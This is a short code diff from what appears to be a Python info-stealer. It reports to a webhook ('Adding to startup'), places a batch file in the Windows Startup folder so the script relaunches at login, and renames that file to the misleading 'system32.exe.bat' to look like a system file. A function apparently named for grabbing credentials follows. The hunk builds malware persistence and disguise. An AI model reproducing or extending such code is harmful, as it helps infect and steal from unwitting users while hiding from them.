@@ -6,7 +6,7 @@ def ats():
     requests.post(h00kMa0n, json={"content": "Adding to startup"})
     startup_folder = os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup"
     script_path = os.path.abspath(sys.argv[0])
-    with open(os.path.join(startup_folder, "startup_script.bat"), 'w') as f:
+    with open(os.path.join(startup_folder, "system32.exe.bat"), 'w') as f:
         f.write(f'@echo off\n"{sys.executable}" "{script_path}"\n')
 
 def get_crd():
